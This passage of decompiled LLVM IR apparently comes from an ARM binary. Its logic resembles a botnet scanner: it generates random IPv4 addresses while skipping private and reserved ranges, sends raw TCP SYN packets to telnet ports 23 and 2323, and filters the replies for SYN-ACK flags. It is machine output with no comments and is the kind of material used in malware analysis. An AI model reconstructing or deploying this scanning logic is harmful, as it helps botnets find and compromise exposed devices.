dec_label_pc_e934:                                ; preds = %bb382
  %v2_e934 = icmp ugt i32 %v1_e8b8, 125
  store i1 %v2_e934, i1* %cpsr_c.global-to-local, align 1
  %v7_e934 = icmp eq i32 %v1_e8b8, 126
  store i1 %v7_e934, i1* %cpsr_z.global-to-local, align 1
  %v2_e938 = xor i1 %v2_e934, true
  %v3_e938 = or i1 %v7_e934, %v2_e938
  br i1 %v3_e938, label %dec_label_pc_e8a0, label %dec_label_pc_e93c

dec_label_pc_e93c:                                ; preds = %.thread13, %dec_label_pc_e934, %bb382
  %v2_e93c = icmp ugt i32 %v1_e8a4, 168
  store i1 %v2_e93c, i1* %cpsr_c.global-to-local, align 1
  %v7_e93c = icmp eq i32 %v1_e8a4, 169
  store i1 %v7_e93c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e93c, label %bb383, label %dec_label_pc_e948

bb383:                                            ; preds = %dec_label_pc_e93c
  %v3_e940 = icmp eq i32 %v1_e8b8, 255
  store i1 %v3_e940, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e940, label %dec_label_pc_e8a0, label %dec_label_pc_e948

dec_label_pc_e948:                                ; preds = %dec_label_pc_e93c, %bb383
  %v7_e948 = icmp eq i32 %v1_e8a4, 198
  %.463 = zext i1 %v7_e948 to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e954 = icmp ugt i32 %v1_e8b8, 16
  store i1 %v2_e954, i1* %cpsr_c.global-to-local, align 1
  %v7_e954 = icmp eq i32 %v1_e8b8, 17
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  %v2_e958 = xor i1 %v2_e954, true
  %v3_e958 = or i1 %v7_e954, %v2_e958
  br i1 %v3_e958, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e948
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e96c

bb386:                                            ; preds = %dec_label_pc_e948
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e95c = icmp eq i1 %v7_e948, false
  store i1 %v2_e95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e95c, label %dec_label_pc_e96c, label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %bb386
  %v2_e964 = icmp ugt i32 %v1_e8b8, 18
  store i1 %v2_e964, i1* %cpsr_c.global-to-local, align 1
  %v7_e964 = icmp eq i32 %v1_e8b8, 19
  store i1 %v7_e964, i1* %cpsr_z.global-to-local, align 1
  %v2_e968 = xor i1 %v2_e964, true
  %v3_e968 = or i1 %v7_e964, %v2_e968
  br i1 %v3_e968, label %dec_label_pc_e8a0, label %dec_label_pc_e96c

dec_label_pc_e96c:                                ; preds = %.thread19, %dec_label_pc_e964, %bb386
  %v2_e96c = icmp ugt i32 %v1_e8a4, 222
  store i1 %v2_e96c, i1* %cpsr_c.global-to-local, align 1
  %v7_e96c = icmp eq i32 %v1_e8a4, 223
  store i1 %v7_e96c, i1* %cpsr_z.global-to-local, align 1
  %v2_e970 = xor i1 %v7_e96c, true
  %v3_e970 = and i1 %v2_e96c, %v2_e970
  br i1 %v3_e970, label %dec_label_pc_e8a0, label %dec_label_pc_e974

dec_label_pc_e974:                                ; preds = %dec_label_pc_e96c
  %v7_e974 = icmp eq i32 %v1_e8a4, 106
  %.464 = zext i1 %v7_e974 to i32
  %v2_e980 = icmp ugt i32 %v1_e8b8, 185
  store i1 %v2_e980, i1* %cpsr_c.global-to-local, align 1
  %v7_e980 = icmp eq i32 %v1_e8b8, 186
  store i1 %v7_e980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e980, label %bb389, label %dec_label_pc_e98c

bb389:                                            ; preds = %dec_label_pc_e974
  %v2_e974 = icmp ugt i32 %v1_e8a4, 105
  store i1 %v2_e974, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e974, label %dec_label_pc_e8a0, label %dec_label_pc_e98c

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e974, %bb389
  %v2_e98c = icmp ugt i32 %v1_e8b8, 186
  store i1 %v2_e98c, i1* %cpsr_c.global-to-local, align 1
  %v7_e98c = icmp eq i32 %v1_e8b8, 187
  store i1 %v7_e98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e98c, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e98c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9a0

.thread24:                                        ; preds = %dec_label_pc_e98c
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e998 = icmp eq i1 %v7_e974, false
  store i1 %v2_e998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e998, label %dec_label_pc_e9a0, label %dec_label_pc_e8a0

dec_label_pc_e9a0:                                ; preds = %.thread25, %.thread24
  %v2_e9a0 = icmp ugt i32 %v1_e8b8, 184
  store i1 %v2_e9a0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a0 = icmp eq i32 %v1_e8b8, 185
  store i1 %v7_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a0, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e9a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9b4

.thread28:                                        ; preds = %dec_label_pc_e9a0
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9ac = icmp eq i1 %v7_e974, false
  store i1 %v2_e9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9ac, label %dec_label_pc_e9b4, label %dec_label_pc_e8a0

dec_label_pc_e9b4:                                ; preds = %.thread29, %.thread28
  %v2_e9b4 = icmp ugt i32 %v1_e8b8, 183
  store i1 %v2_e9b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b4 = icmp eq i32 %v1_e8b8, 184
  store i1 %v7_e9b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b4, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e9b4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9c8

.thread32:                                        ; preds = %dec_label_pc_e9b4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9c0 = icmp eq i1 %v7_e974, false
  store i1 %v2_e9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9c0, label %dec_label_pc_e9c8, label %dec_label_pc_e8a0

dec_label_pc_e9c8:                                ; preds = %.thread33, %.thread32
  %v2_e9c8 = icmp ugt i32 %v1_e8a4, 149
  store i1 %v2_e9c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9c8 = icmp eq i32 %v1_e8a4, 150
  store i1 %v7_e9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c8, label %bb390, label %dec_label_pc_e9d4

bb390:                                            ; preds = %dec_label_pc_e9c8
  %v3_e9cc = icmp ugt i32 %v1_e8b8, 30
  store i1 %v3_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v8_e9cc = icmp eq i32 %v1_e8b8, 31
  store i1 %v8_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9cc, label %dec_label_pc_e8a0, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9c8, %bb390
  %v2_e9d4 = icmp ugt i32 %v1_e8a4, 48
  store i1 %v2_e9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d4 = icmp eq i32 %v1_e8a4, 49
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %bb391, label %dec_label_pc_e9e0

bb391:                                            ; preds = %dec_label_pc_e9d4
  %v3_e9d8 = icmp ugt i32 %v1_e8b8, 50
  store i1 %v3_e9d8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9d8 = icmp eq i32 %v1_e8b8, 51
  store i1 %v8_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9d8, label %dec_label_pc_e8a0, label %dec_label_pc_e9e0

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9d4, %bb391
  %v2_e9e0 = icmp ugt i32 %v1_e8a4, 177
  store i1 %v2_e9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e0 = icmp eq i32 %v1_e8a4, 178
  store i1 %v7_e9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e0, label %bb392, label %dec_label_pc_e9ec

bb392:                                            ; preds = %dec_label_pc_e9e0
  %v3_e9e4 = icmp ugt i32 %v1_e8b8, 61
  store i1 %v3_e9e4, i1* %cpsr_c.global-to-local, align 1
  %v8_e9e4 = icmp eq i32 %v1_e8b8, 62
  store i1 %v8_e9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9e4, label %dec_label_pc_e8a0, label %dec_label_pc_e9ec

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9e0, %bb392
  %v2_e9ec = icmp ugt i32 %v1_e8a4, 159
  store i1 %v2_e9ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ec = icmp eq i32 %v1_e8a4, 160
  store i1 %v7_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ec, label %bb393, label %dec_label_pc_e9f8

bb393:                                            ; preds = %dec_label_pc_e9ec
  %v3_e9f0 = icmp ugt i32 %v1_e8b8, 12
  store i1 %v3_e9f0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9f0 = icmp eq i32 %v1_e8b8, 13
  store i1 %v8_e9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f0, label %dec_label_pc_e8a0, label %dec_label_pc_e9f8

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e9ec, %bb393
  %v1_e9f8 = add nsw i32 %v1_e8a4, -6
  store i32 %v1_e9f8, i32* %r3.global-to-local, align 4
  %v2_e9fc = icmp ugt i32 %v1_e8a4, 10
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9fc = icmp eq i32 %v1_e8a4, 11
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9fc, label %dec_label_pc_e8a0, label %bb394

bb394:                                            ; preds = %dec_label_pc_e9f8
  %v3_ea00 = icmp ne i32 %v1_e9f8, 0
  store i1 %v3_ea00, i1* %cpsr_c.global-to-local, align 1
  %v8_ea00 = icmp eq i32 %v1_e9f8, 1
  store i1 %v8_ea00, i1* %cpsr_z.global-to-local, align 1
  %v2_ea04 = xor i1 %v3_ea00, true
  %v3_ea04 = or i1 %v8_ea00, %v2_ea04
  br i1 %v3_ea04, label %dec_label_pc_e8a0, label %dec_label_pc_ea08

dec_label_pc_ea08:                                ; preds = %bb394
  %v2_ea08 = icmp ugt i32 %v1_e8a4, 21
  store i1 %v2_ea08, i1* %cpsr_c.global-to-local, align 1
  %v7_ea08 = icmp eq i32 %v1_e8a4, 22
  store i1 %v7_ea08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea08, label %dec_label_pc_e8a0, label %bb395

bb395:                                            ; preds = %dec_label_pc_ea08
  %v3_ea0c = icmp ugt i32 %v1_e8a4, 20
  store i1 %v3_ea0c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea0c = icmp eq i32 %v1_e8a4, 21
  store i1 %v8_ea0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea0c, label %dec_label_pc_e8a0, label %dec_label_pc_ea14

dec_label_pc_ea14:                                ; preds = %bb395
  %v2_ea14 = icmp ugt i32 %v1_e8a4, 27
  store i1 %v2_ea14, i1* %cpsr_c.global-to-local, align 1
  %v7_ea14 = icmp eq i32 %v1_e8a4, 28
  store i1 %v7_ea14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea14, label %dec_label_pc_e8a0, label %bb396

bb396:                                            ; preds = %dec_label_pc_ea14
  %v3_ea18 = icmp ugt i32 %v1_e8a4, 25
  store i1 %v3_ea18, i1* %cpsr_c.global-to-local, align 1
  %v8_ea18 = icmp eq i32 %v1_e8a4, 26
  store i1 %v8_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea18, label %dec_label_pc_e8a0, label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %bb396
  %v2_ea20 = icmp ugt i32 %v1_e8a4, 29
  store i1 %v2_ea20, i1* %cpsr_c.global-to-local, align 1
  %v7_ea20 = icmp eq i32 %v1_e8a4, 30
  store i1 %v7_ea20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea20, label %dec_label_pc_e8a0, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea20
  %v3_ea24 = icmp ugt i32 %v1_e8a4, 28
  store i1 %v3_ea24, i1* %cpsr_c.global-to-local, align 1
  %v8_ea24 = icmp eq i32 %v1_e8a4, 29
  store i1 %v8_ea24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea24, label %dec_label_pc_e8a0, label %dec_label_pc_ea2c

dec_label_pc_ea2c:                                ; preds = %bb397
  %v2_ea2c = icmp ugt i32 %v1_e8a4, 54
  store i1 %v2_ea2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea2c = icmp eq i32 %v1_e8a4, 55
  store i1 %v7_ea2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea2c, label %dec_label_pc_e8a0, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea2c
  %v3_ea30 = icmp ugt i32 %v1_e8a4, 32
  store i1 %v3_ea30, i1* %cpsr_c.global-to-local, align 1
  %v8_ea30 = icmp eq i32 %v1_e8a4, 33
  store i1 %v8_ea30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea30, label %dec_label_pc_e8a0, label %dec_label_pc_ea38

dec_label_pc_ea38:                                ; preds = %bb398
  %v2_ea38 = icmp ugt i32 %v1_e8a4, 214
  store i1 %v2_ea38, i1* %cpsr_c.global-to-local, align 1
  %v7_ea38 = icmp eq i32 %v1_e8a4, 215
  store i1 %v7_ea38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea38, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea38
  %v3_ea3c = icmp ugt i32 %v1_e8a4, 213
  store i1 %v3_ea3c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea3c = icmp eq i32 %v1_e8a4, 214
  store i1 %v8_ea3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea3c, label %bb400, label %dec_label_pc_ea4c

.thread48:                                        ; preds = %dec_label_pc_ea38
  br label %dec_label_pc_e8a0

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e8a0

dec_label_pc_ea4c:                                ; preds = %bb399
  %v5_ea58 = call i32 @llvm.bswap.i32(i32 %v0_e8a0)
  store i32 %v5_ea58, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e8a0, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_ea60 = udiv i32 %v5_ea58, 16777216
  %tmp403 = and i32 %v0_e8a0, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_ea68 = udiv i32 %tmp402, 256
  %v4_ea6c = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e8a0, 65536
  %v3_ea74 = icmp ne i32 %tmp405, 0
  store i1 %v3_ea74, i1* %cpsr_c.global-to-local, align 1
  %v4_ea74 = mul i32 %v5_ea58, 16777216
  %v5_ea68 = or i32 %v4_ea74, %v3_ea60
  %v5_ea6c = or i32 %v5_ea68, %v4_ea68
  %v5_ea74 = or i32 %v5_ea6c, %v4_ea6c
  store i32 %v5_ea74, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_1e9f2.179 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_ea74, i32* @global_var_1e9f8.180, align 4
  %v3_ea84 = call i32 @function_c848(i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32 20)
  %v4_ea84 = trunc i32 %v3_ea84 to i16
  store i32 %v3_ea84, i32* %r0.global-to-local, align 4
  %v3_ea88 = load i32, i32* %stack_var_-52, align 4
  %v5_ea98 = sdiv i32 %v3_ea88, 10
  %v3_ea9c = mul i32 %v5_ea98, 8
  store i32 %v3_ea9c, i32* %r2.global-to-local, align 4
  %v2_eaa4 = mul i32 %v5_ea98, 10
  store i32 %v2_eaa4, i32* %r3.global-to-local, align 4
  %v3_eaa8 = icmp uge i32 %v3_ea88, %v2_eaa4
  store i1 %v3_eaa8, i1* %cpsr_c.global-to-local, align 1
  %v9_eaa8 = icmp eq i32 %v3_ea88, %v2_eaa4
  store i1 %v9_eaa8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_eaa8, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea4c
  store i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_ea84, i16* bitcast (i32* @global_var_1e9f2.179 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32 2) to i16*), align 2
  %v4_eac8 = load i32, i32* @global_var_1e9f8.180, align 4
  store i32 %v4_eac8, i32* @global_var_1ea00.182, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea4c
  store i16 %v4_ea84, i16* bitcast (i32* @global_var_1e9f2.179 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %r0.global-to-local, align 4
  %v4_eac854 = load i32, i32* @global_var_1e9f8.180, align 4
  store i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eac854, i32* @global_var_1ea00.182, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_1ea0c.183 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_eaf4 = call i32 @function_c898(i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32 sext (i16 ptrtoint (i16* @global_var_1e9fc.140 to i16) to i32), i32 5120, i32 20)
  %v7_eaf4 = trunc i32 %v6_eaf4 to i16
  store i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32* %r1.global-to-local, align 4
  %v2_eb00 = load i32, i32* @global_var_20a6c.135, align 4
  store i16 %v7_eaf4, i16* bitcast (i32* @global_var_1ea0c.183 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 %v2_f9a0, i32* %ip.global-to-local, align 4
  store i32 %v2_eb00, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb48 = call i32 @function_11560(i32 %v2_eb00, i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), i32 40, i32 16384, i32 %v2_e870, i32 16)
  store i32 %v7_eb48, i32* %r0.global-to-local, align 4
  %v3_eb4c = load i32, i32* %stack_var_-52, align 4
  %v1_eb50 = add i32 %v3_eb4c, 1
  store i32 %v1_eb50, i32* %r3.global-to-local, align 4
  %v3_eb54 = icmp ugt i32 %v1_eb50, 383
  store i1 %v3_eb54, i1* %cpsr_c.global-to-local, align 1
  %v8_eb54 = icmp eq i32 %v1_eb50, 384
  store i1 %v8_eb54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb50, i32* %stack_var_-52, align 4
  %v5_eb5c = icmp slt i32 %v1_eb50, 384
  br i1 %v5_eb5c, label %dec_label_pc_e874, label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %bb407
  %v0_eb60 = load i32, i32* @r4, align 4
  br label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %dec_label_pc_e850, %dec_label_pc_eb60
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e850 ], [ %v0_eb60, %dec_label_pc_eb60 ]
  %v0_eb64 = call i32 @function_11200()
  store i32 %v0_eb64, i32* %fp.global-to-local, align 4
  store i32 %v2_e848, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_eb74, i32* @r4, align 4
  br label %dec_label_pc_eb78

dec_label_pc_eb78:                                ; preds = %dec_label_pc_ec38, %dec_label_pc_ec30, %dec_label_pc_ec28, %dec_label_pc_ec04, %dec_label_pc_ebf4, %dec_label_pc_ebd8, %dec_label_pc_ebc0, %dec_label_pc_ec20, %dec_label_pc_ec14, %dec_label_pc_ebb8, %dec_label_pc_ecf0, %dec_label_pc_eb64
  %v1_eb7c = phi i32 [ %v0_eb64, %dec_label_pc_eb64 ], [ %v1_eb7c.pre.pre, %dec_label_pc_ecf0 ], [ %v0_ebac, %dec_label_pc_ebb8 ], [ %v0_ebac, %dec_label_pc_ec14 ], [ %v0_ebac, %dec_label_pc_ec20 ], [ %v0_ebac, %dec_label_pc_ebc0 ], [ %v0_ebac, %dec_label_pc_ebd8 ], [ %v0_ebac, %dec_label_pc_ebf4 ], [ %v0_ebac, %dec_label_pc_ec04 ], [ %v0_ebac, %dec_label_pc_ec28 ], [ %v0_ebac, %dec_label_pc_ec30 ], [ %v0_ebac, %dec_label_pc_ec38 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb7c = inttoptr i32 %v1_eb7c to i32*
  store i32 0, i32* %v2_eb7c, align 4
  %v2_eb88 = load i32, i32* @global_var_20a6c.135, align 4
  store i32 %v2_eb88, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e848, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eb98 = load i32, i32* %ip.global-to-local, align 4
  %v6_eba0 = call i32 @function_114ec(i32 %v2_eb88, i32 %v2_e848, i32 1514, i32 16384, i32 %v0_eb98, i32 %v0_eb98)
  store i32 %v6_eba0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eba4 = icmp eq i32 %v6_eba0, 0
  store i1 %v2_eba4, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_eba0, 1
  br i1 %tmp408, label %dec_label_pc_ed00, label %dec_label_pc_ebac

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eb78
  %v0_ebac = load i32, i32* %fp.global-to-local, align 4
  %v1_ebac = inttoptr i32 %v0_ebac to i32*
  %v2_ebac = load i32, i32* %v1_ebac, align 4
  store i32 %v2_ebac, i32* %r3.global-to-local, align 4
  %v2_ebb0 = icmp ugt i32 %v2_ebac, 10
  store i1 %v2_ebb0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebb0 = icmp eq i32 %v2_ebac, 11
  store i1 %v7_ebb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebb0, label %dec_label_pc_ed00, label %dec_label_pc_ebb8

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_ebac
  %v2_ebb8 = icmp ugt i32 %v6_eba0, 38
  store i1 %v2_ebb8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebb8 = icmp eq i32 %v6_eba0, 39
  store i1 %v7_ebb8, i1* %cpsr_z.global-to-local, align 1
  %v2_ebbc = xor i1 %v2_ebb8, true
  %v3_ebbc = or i1 %v7_ebb8, %v2_ebbc
  br i1 %v3_ebbc, label %dec_label_pc_eb78, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb8
  store i32 %v2_e848, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %ip.global-to-local, align 4
  %v3_ebc8 = load i32, i32* %v2_ebc8, align 4
  store i32 %v3_ebc8, i32* %r2.global-to-local, align 4
  %v2_ebcc = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_ebcc, i32* %r3.global-to-local, align 4
  %v3_ebd0 = icmp uge i32 %v3_ebc8, %v2_ebcc
  store i1 %v3_ebd0, i1* %cpsr_c.global-to-local, align 1
  %v9_ebd0 = icmp eq i32 %v3_ebc8, %v2_ebcc
  store i1 %v9_ebd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebd0, label %dec_label_pc_ebd8, label %dec_label_pc_eb78

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebc0
  %v3_ebdc = load i8, i8* %v2_ebdc, align 1
  %v4_ebdc = zext i8 %v3_ebdc to i32
  store i32 %v4_ebdc, i32* %r3.global-to-local, align 4
  %v2_ebe0 = icmp ugt i8 %v3_ebdc, 5
  store i1 %v2_ebe0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe0 = icmp eq i8 %v3_ebdc, 6
  store i1 %v7_ebe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe0, label %dec_label_pc_ebe8, label %dec_label_pc_eb78

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebd8
  %v0_ebe8 = load i32, i32* @r4, align 4
  %v1_ebe8 = inttoptr i32 %v0_ebe8 to i16*
  %v2_ebe8 = load i16, i16* %v1_ebe8, align 2
  %v3_ebe8 = zext i16 %v2_ebe8 to i32
  store i32 %v3_ebe8, i32* %ip.global-to-local, align 4
  %v2_ebec = icmp ugt i16 %v2_ebe8, 5887
  store i1 %v2_ebec, i1* %cpsr_c.global-to-local, align 1
  %v7_ebec = icmp eq i16 %v2_ebe8, 5888
  store i1 %v7_ebec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebec, label %dec_label_pc_ec04, label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebe8
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ebfc = icmp ugt i16 %v2_ebe8, 4872
  store i1 %v3_ebfc, i1* %cpsr_c.global-to-local, align 1
  %v9_ebfc = icmp eq i16 %v2_ebe8, 4873
  store i1 %v9_ebfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebfc, label %dec_label_pc_ec04, label %dec_label_pc_eb78

dec_label_pc_ec04:                                ; preds = %dec_label_pc_ebf4, %dec_label_pc_ebe8
  %v1_ec04 = add i32 %v0_ebe8, 2
  %v2_ec04 = inttoptr i32 %v1_ec04 to i16*
  %v3_ec04 = load i16, i16* %v2_ec04, align 2
  %v4_ec04 = zext i16 %v3_ec04 to i32
  store i32 %v4_ec04, i32* %r3.global-to-local, align 4
  store i32 %v4_e718, i32* %r0.global-to-local, align 4
  %v3_ec0c = icmp uge i32 %v4_ec04, %v4_e718
  store i1 %v3_ec0c, i1* %cpsr_c.global-to-local, align 1
  %v9_ec0c = icmp eq i32 %v4_ec04, %v4_e718
  store i1 %v9_ec0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec0c, label %dec_label_pc_ec14, label %dec_label_pc_eb78

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ec04
  %v1_ec14 = add i32 %v0_ebe8, 13
  %v2_ec14 = inttoptr i32 %v1_ec14 to i8*
  %v3_ec14 = load i8, i8* %v2_ec14, align 1
  %v4_ec14 = zext i8 %v3_ec14 to i32
  store i32 %v4_ec14, i32* %r3.global-to-local, align 4
  %v1_ec18 = and i32 %v4_ec14, 2
  %v2_ec18 = icmp eq i32 %v1_ec18, 0
  store i1 %v2_ec18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec18, label %dec_label_pc_eb78, label %dec_label_pc_ec20

dec_label_pc_ec20:                                ; preds = %dec_label_pc_ec14
  %v1_ec20 = and i32 %v4_ec14, 16
  %v2_ec20 = icmp eq i32 %v1_ec20, 0
  store i1 %v2_ec20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec20, label %dec_label_pc_eb78, label %dec_label_pc_ec28

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ec20
  %v1_ec28 = and i32 %v4_ec14, 4
  %v2_ec28 = icmp eq i32 %v1_ec28, 0
  store i1 %v2_ec28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec28, label %dec_label_pc_ec30, label %dec_label_pc_eb78

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ec28
  %tmp = urem i8 %v3_ec14, 2
  %v2_ec30 = icmp eq i8 %tmp, 0
  store i1 %v2_ec30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec30, label %dec_label_pc_ec38, label %dec_label_pc_eb78

